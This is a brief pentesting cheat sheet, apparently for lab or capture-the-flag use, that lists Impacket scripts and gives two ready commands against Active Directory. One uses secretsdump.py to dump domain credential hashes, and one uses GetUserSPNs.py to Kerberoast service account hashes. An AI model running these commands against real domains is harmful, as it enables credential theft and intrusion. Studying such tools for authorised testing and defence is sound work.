# Impacket

Impacket is a suit of tool used to pentest Active Directories


## Useful pieces of code
- GetNPUsers.py
- GetUserSPNs.py
- secretDump.py


## Enum for additionnal information w/ secretdump.py
Requirements : Credentials
```bash
secretsdump.py -just-dc backup@spookysec.local
```	

## Kerberoast
This following command line will dump Kerberos hashes and return any kerberoastable users.  
Requirements : Credentials
```bash
GetUserSPNs.py controller.local/"username":"password" -dc-ip <IP> -request
```